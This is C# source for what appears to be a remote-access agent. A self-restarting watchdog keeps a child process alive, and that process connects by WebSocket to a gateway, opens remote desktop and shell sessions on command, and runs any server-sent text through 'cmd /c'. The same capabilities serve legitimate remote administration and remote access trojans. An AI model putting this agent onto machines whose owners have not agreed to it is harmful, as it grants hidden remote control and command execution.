#pragma warning disable IDE0079 // 请删除不必要的忽略
#pragma warning disable CA1050 // 在命名空间中声明类型

using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using System.Diagnostics;
using System.IO.Pipes;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;

public class MainWorker(IConfiguration cfg, ILogger<MainWorker> logger, NuGet NuGet, IHostApplicationLifetime _lifetime) : BackgroundService
{
    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        try {
            var pid = cfg.GetValue<int>("pid");
            if (pid == 0) {
                while (!stoppingToken.IsCancellationRequested) {
                    try {
                        using var ps = Process.Start(Environment.ProcessPath, $"--pid {Environment.ProcessId}");
                        try {
                            await ps.WaitForExitAsync(stoppingToken);
                        } finally {
                            ps.Kill();
                        }
                    } catch (Exception) {
                    } finally {
                        await Task.Delay(6000, stoppingToken);
                    }
                }
            } else {
                await NuGet.DownloadAsync("system.management.dll", "9.0.8");
                await SetupWebSocketAsync(stoppingToken);
            }
        } finally {
            _lifetime.StopApplication();
        }
    }

    private async Task SetupWebSocketAsync(CancellationToken cancellationToken)
    {
        var id = Guid.Empty;
        try {
            id = new Guid(File.ReadAllBytes(Path.Combine(App.CurrentDirectory, "rgb")));
        } catch (Exception) {
        }
        for (int i = 0; i < 10; i++) {
            try {
                await WebSocketFactory.CreateAsync($"{App.Gateway}?id={id}", async (ctx) => {
                    using var cts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
                    try {
                        await ctx.ReceiveAsync(async (action, data) => {
                            var bytes = data.Length == 0 ? [] : new byte[data.Length];
                            if (data.Length > 0) {
                                data.CopyTo(bytes);
                            }
                            _ = ProcessMessageAsync(ctx, action, bytes, cts.Token);
                            await Task.CompletedTask;
                        }, cts.Token);
                    } catch (Exception) { } finally {
                        cts.Cancel();
                    }
                }, cancellationToken);
            } catch (OperationCanceledException) {
                break;
            } catch (Exception) when (i < 10 - 1) {
                await Task.Delay(6000, cancellationToken);
            }
        }
    }

    private async Task ProcessMessageAsync(WebSocketFactory ctx, int action, byte[] data, CancellationToken cancellationToken)
    {
        try {
            if (action == 0x00) {
                try {
                    ArgumentOutOfRangeException.ThrowIfNotEqual(data.Length, 16);
                    App.Id = new Guid(data);
                    logger.LogWarning("{id}", App.Id);
                    File.WriteAllBytes(Path.Combine(App.CurrentDirectory, "rgb"), data);
                    await ctx.SendAsync(action, JsonSerializer.SerializeToUtf8Bytes(new CustomOSInformation { }), cancellationToken);
                } catch (Exception) {
                    _lifetime.StopApplication();
                }
            }
            if (action == 0x01) {
                var taskid = new Guid(data);
                logger.LogWarning("Desktop Task Id: {taskid}", taskid);
                var pipe = Guid.NewGuid().ToString();
                using (var ps = Process.GetCurrentProcess()) {
                    if (ps.SessionId > 0) {
                        Process.Start(Environment.ProcessPath, $"--type desktop --pipe {pipe}").Dispose();
                    } else if (!Utils.CreateProcessAsCurrentUser($"{Environment.ProcessPath} --type desktop --pipe {pipe}")) {
                        await ctx.SendAsync(500, Encoding.UTF8.GetBytes("failed to start"), cancellationToken);
                        return;
                    }
                }
                using var nps = new NamedPipeServerStream(pipe, PipeDirection.In);
                await nps.WaitForConnectionAsync(cancellationToken);
                using var reader = new StreamReader(nps);
                var ticket = await reader.ReadToEndAsync(cancellationToken);
                await ctx.SendAsync(action, taskid.ToByteArray().Concat(Encoding.UTF8.GetBytes(ticket)).ToArray(), cancellationToken);
            }
            if (action == 0x03) {
                var taskid = new Guid(data);
                logger.LogWarning("Shell Task Id: {taskid}", taskid);
                var pipeName = Guid.CreateVersion7().ToString();
                using var nps = new NamedPipeServerStream(pipeName, PipeDirection.In);
                using var ps = Process.Start(Environment.ProcessPath, $"--type shell --pipe {pipeName}");
                await nps.WaitForConnectionAsync(cancellationToken);
                using var reader = new StreamReader(nps);
                var ticket = await reader.ReadToEndAsync(cancellationToken);
                await ctx.SendAsync(action, taskid.ToByteArray().Concat(Encoding.UTF8.GetBytes(ticket)).ToArray(), cancellationToken);
            }
            if (action == 0x7b) {
                using var ps = Process.Start("cmd", $"/c {Encoding.UTF8.GetString(data)}");
            }
            if (action == 0xff) {
                _lifetime.StopApplication();
            }
        } catch (Exception ex) {
            logger.LogError("{ex}", ex);
        }
    }
}